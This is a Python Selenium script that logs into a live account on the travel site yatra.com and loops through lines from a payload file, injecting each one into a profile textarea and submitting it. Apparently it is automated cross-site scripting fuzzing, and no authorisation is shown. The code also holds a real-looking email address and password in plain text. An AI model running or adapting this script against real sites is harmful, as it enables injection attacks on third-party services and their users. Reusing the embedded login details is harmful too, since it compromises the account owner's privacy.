from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options as options
from selenium.webdriver.firefox.options import Options as Firefox_Options
from threading import Thread
from time import sleep

def popclick():
	while 1:
		try:
			pop = driver.find_element_by_xpath('/html/body/div[3]/div[9]/div[2]/button')
			pop.click()
		except KeyboardInterrupt:
			exit()
		except:
			pass

profile = webdriver.FirefoxProfile('/home/darksoul/.mozilla/firefox/xk1uxyq9.Parrot/')
driver = webdriver.Firefox(profile)
driver.get('https://secure.yatra.com/manage-bookings/allbookings?&_ga=2.199058159.1726686819.1605719263-904679195.1605630576#/profile')

Thread(target=popclick,daemon=True).start()

try:
	wait = WebDriverWait(driver,10)
	wait.until(EC.visibility_of_element_located((By.ID,"login-form")))

	email = driver.find_element_by_xpath('//*[@id="login-input"]')
	email.send_keys('jerondeepak@psnacet.edu.in')

	cont = driver.find_element_by_xpath('//*[@id="login-continue-btn"]')
	cont.click()

	wait = WebDriverWait(driver,10)
	wait.until(EC.visibility_of_element_located((By.ID,"password-screen-label")))

	password = driver.find_element_by_xpath('//*[@id="login-password"]')
	password.send_keys('Testxss123')

	login = driver.find_element_by_xpath('//*[@id="login-submit-btn"]')
	login.click()
except:
	pass
with open('payload.txt','r') as f_obj:
	payload_data = [i[:-1] for i in f_obj]
start=int(input('Starting Payload index : '))
for i in range(start,len(payload_data)):

	print ('[ {} ]{}'.format(i,payload_data[i]))
	while 1:
		try:
			button = driver.find_element_by_xpath('/html/body/main/div/div[1]/div/div/div/div/div[2]/div[1]/div[2]/div[1]/div/div[2]/div/div[1]/button')
			button.click()
			break
		except:
			pass

	while 1:
		try:
			textarea = driver.find_element_by_xpath('/html/body/main/div/div[1]/div/div/div/div/div[2]/div[1]/div[2]/div[2]/form/div/div[5]/div[5]/div[2]/textarea')
			textarea.clear()
			sleep(1)
			textarea.send_keys(payload_data[i])
			break
		except:
			pass

	while 1:
		try:
			submit_btn = driver.find_element_by_xpath('/html/body/main/div/div[1]/div/div/div/div/div[2]/div[1]/div[2]/div[2]/form/div/div[7]/div[2]/button')
			submit_btn.click()


			sleep(1)
			break
		except:
			pass
